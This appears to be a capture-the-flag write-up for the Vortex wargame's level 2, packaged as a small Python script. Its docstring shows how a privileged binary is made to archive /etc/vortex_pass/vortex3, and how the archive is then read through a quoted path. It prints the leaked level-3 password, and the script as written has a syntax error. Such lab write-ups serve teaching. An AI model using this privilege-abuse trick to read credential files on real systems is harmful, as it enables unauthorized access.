#!/usr/bin/env python3

__docs__ =
'''
this one had a trick, $$ in bash is the pid of the current parent shell.
execv doesn't use bash though, so tar will create the file named /tmp/ownership.$$.tar.
if you try to cat /tmp/ownership.$$.tar, it will insert the PID of your parent process
You just need to escape the path with '' as such

vortex2@melinda:/vortex$ ./vortex2 /etc/vortex_pass/vortex3 && cat '/tmp/ownership.$$.tar'
/bin/tar: Removing leading `/' from member names
etc/vortex_pass/vortex30000400001161300116130000000001212431355122015324 0ustar  vortex3vortex364ncXTvx#
vortex2@melinda:/vortex$

username: vortex3
password: 64ncXTvx#
'''

print(__docs__)
